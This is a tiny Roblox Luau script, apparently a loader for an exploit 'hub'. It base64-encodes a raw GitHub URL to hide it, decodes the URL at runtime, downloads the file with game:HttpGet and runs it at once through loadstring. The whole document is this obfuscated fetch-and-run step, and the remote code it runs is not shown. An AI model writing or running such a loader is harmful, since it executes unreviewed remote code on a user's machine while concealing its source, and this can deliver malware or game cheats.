local HS = game:GetService("HttpService")

local encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3R5eXlneXlnNzc4LW1ha2VyL1JvYmxveC1zY3JpcHQvbWFpbi9WdWFjdWFodWIubHVh"

local url = HS:Base64Decode(encoded)

loadstring(game:HttpGet(url))()
